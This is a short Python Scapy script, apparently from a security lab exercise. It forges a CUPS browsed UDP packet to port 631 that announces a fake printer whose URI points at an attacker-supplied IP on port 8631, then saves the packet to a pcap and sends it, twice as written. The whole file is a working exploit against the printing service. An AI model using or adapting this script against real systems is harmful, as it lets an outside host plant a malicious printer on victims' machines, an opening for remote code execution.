import argparse
from scapy.all import IP, UDP, Raw, send, wrpcap

def main():
    # 1. arguments from CLI
    parser = argparse.ArgumentParser(description="tool for testing udp packets sending")
    parser.add_argument("-t", "--target", required=True, help="victim ip address")
    parser.add_argument("-p", "--port", type=int, default=631, help="destination port (e.g., 631)")
    parser.add_argument("-o", "--output", default="evidence/attack_packet.pcap", help="path to save the PCAP file")
    parser.add_argument("-a", "--attacker", help="attacker IP address for the URI")
    
    args = parser.parse_args()

    # variables
    target_ip = args.target
    target_port = args.port
    pcap_file = args.output
    attacker_ip = args.attacker

    print(f"[*] Preparing attack towards {target_ip} on UDP port {target_port}...")

    # 2. Payload definition
    # here i will put the legacy text string that he expects, like:
    # ipp://<indirizzo-ip>:<porta>/printers/<nome-stampante>
    # http://<attacker_ip>:8631/printers/LabPrinter
    # test: TEST_SCAPY_1
    # complete: http://172.17.0.1:8631/printers/LabPrinter
    #payload_malevolo = b"http://{attacker_ip}:8{target_port}/printers/LabPrinter"

    # 3. Stacking
    #packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=payload_malevolo)


    #field definitions
    printer_type = "0" # default type
    printer_state = "3" # idle state
    printer_uri = f"http://{attacker_ip}:8{target_port}/printers/LabPrinter"
    printer_location = "Office HQ" # needed human readable location
    printer_info = "Fake-Printer" # needed human readable info

    payload_formatted = bytes(f'{printer_type} {printer_state} {printer_uri} "{printer_location}" "{printer_info}"', 'UTF-8')

    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=payload_formatted)

    send(packet, verbose=False)


    # 4. saving in PCAP (Export)
    print(f"[*] Saving to {pcap_file}...")
    wrpcap(pcap_file, packet)

    # 5. sending the packet
    print("[*] Sending the packet on the network...")
    send(packet, verbose=False)
    
    print("[+] Operation completed. Check the logs or tcpdump to verify the victim's reaction.")

main()
